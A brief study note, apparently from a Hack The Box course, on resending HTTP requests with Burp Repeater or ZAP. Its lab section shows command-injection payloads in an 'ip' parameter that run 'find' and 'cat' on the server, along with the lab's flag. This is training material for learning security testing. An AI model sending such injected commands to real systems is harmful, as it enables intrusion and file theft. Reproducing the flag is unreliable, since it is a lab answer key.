# Repeating Requests

1) Consult Proxy History
2) Click on one specific request to dipslay details
3) Repeating :
Burp :
[CTRL+R] in Burp to send it to the Repeater tab
Zap :
Open/Resend with Request Editor


## LAB

Burp :
[CTRL+R]
Repeater
Send

Request :
ip=1;find / -name *flag*;

Response :
/var/www/html/flag.txt
/flag.txt

Request :
ip=1;cat /flag.txt;

Response :
HTB{qu1ckly_r3p3471n6_r3qu3575}